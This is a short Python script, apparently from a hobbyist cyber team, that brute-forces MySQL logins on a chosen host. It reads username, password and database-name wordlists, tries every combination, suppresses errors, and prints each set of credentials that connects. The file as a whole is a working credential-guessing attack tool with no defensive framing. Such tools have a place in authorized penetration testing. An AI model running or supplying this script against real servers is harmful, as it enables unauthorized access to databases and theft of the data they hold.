import mysql.connector
import argparse

parser=argparse.ArgumentParser()
parser.add_argument("hostname",help="Example:hummingbirdscyberteam.com",action="store")
parser.add_argument("-u","--username",help="File path for usernames.Example:usernames.txt",action="store")
parser.add_argument("-p","--password",help="File path for passwords.Example:passwords.txt",action="store")
parser.add_argument("-d","--databases",help="File path for databases.Example:databases.txt",action="store")
args=parser.parse_args()

def Main():
    reading_f(args.username,args.password,args.databases,args.hostname)

def reading_f(usernamef,passwordsf,databasesf,hostf):
    a=[]
    b=[]
    c=[]
    with open (usernamef,"r",encoding = "utf-8") as isim:
        for i in isim:
            a.append(i.strip())
    with open(passwordsf,"r",encoding = "utf-8") as sifre:
        for i in sifre:
            b.append(i.strip())
    with open(databasesf,"r",encoding = "utf-8") as database:
        for i in database:
            c.append(i.strip())
    for i in a:
        for j in b:
            for k in c:
                try:
                    connect(i,j,hostf,k)
                except:
                    pass
def connect(u,v,y,z):
    conn = mysql.connector.connect(user=u, password=v, host=y,database=z)
    try:
        if conn.is_connected():
            print("--->Connected to MySQL database, username:" + u + ", password:" + v+", host:"+y+", database:"+z)
            conn.close()
    except:
        pass

if __name__=="__main__":
    try:
        Main()
    except:
        pass
